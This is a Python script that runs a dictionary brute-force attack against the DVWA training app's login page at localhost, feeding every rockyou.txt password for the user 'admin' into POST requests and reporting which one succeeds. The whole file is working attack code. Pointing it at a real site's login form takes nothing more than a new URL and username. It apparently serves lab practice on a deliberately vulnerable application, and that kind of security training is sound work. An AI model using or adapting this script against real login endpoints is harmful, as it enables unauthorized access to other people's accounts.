import requests

# URL of DVWA login page
url = 'http://127.0.0.1/dvwa/login.php'

# Change the following credentials based on your DVWA setup
username = 'admin'  # Common default username for DVWA

# Load the wordlist (rockyou.txt) located in /usr/share/wordlists
def load_wordlist(filepath):
    with open(filepath, 'r', encoding='latin-1') as file:
        return file.readlines()

# Perform the brute force attack
def brute_force(url, username, wordlist):
    for password in wordlist:
        password = password.strip()  # Remove any extra spaces or newlines

        # Data to be sent in POST request
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'  # Name of the submit button in DVWA form
        }

        # Send the POST request to the login page
        response = requests.post(url, data=data)

        # Check if login was successful
        if 'Login failed' not in response.text:
            print(f'[+] Success! Username: {username}, Password: {password}')
            return
        else:
            print(f'[-] Failed attempt with password: {password}')

    print('[-] Brute force attack finished. No valid password found.')

# Main function to run the script
if __name__ == '__main__':
    wordlist = load_wordlist('/usr/share/wordlists/rockyou.txt')
    brute_force(url, username, wordlist)
